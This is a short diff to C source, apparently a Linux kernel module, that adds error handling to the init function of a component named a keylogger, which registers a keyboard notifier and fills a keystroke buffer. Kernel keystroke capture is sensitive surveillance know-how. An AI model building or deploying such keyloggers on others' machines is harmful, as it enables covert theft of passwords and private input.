@@ -67,11 +67,17 @@ static int keyboard_event(struct notifier_block *nblock,
 }
 
 int keylogger_init(void) {
+    int ret;
+
     memset(keylog_buf, 0, MAX_KEYLOG_BUF);
     keylog_pos = 0;
 
     kb_notifier.notifier_call = keyboard_event;
-    register_keyboard_notifier(&kb_notifier);
+    ret = register_keyboard_notifier(&kb_notifier);
+    if (ret) {
+        pr_err(VAULT_KERNEL_TAG " keyboard notifier registration failed (%d)\n", ret);
+        return ret;
+    }
 
     pr_info(VAULT_KERNEL_TAG " keylogger initialized\n");
     return 0;
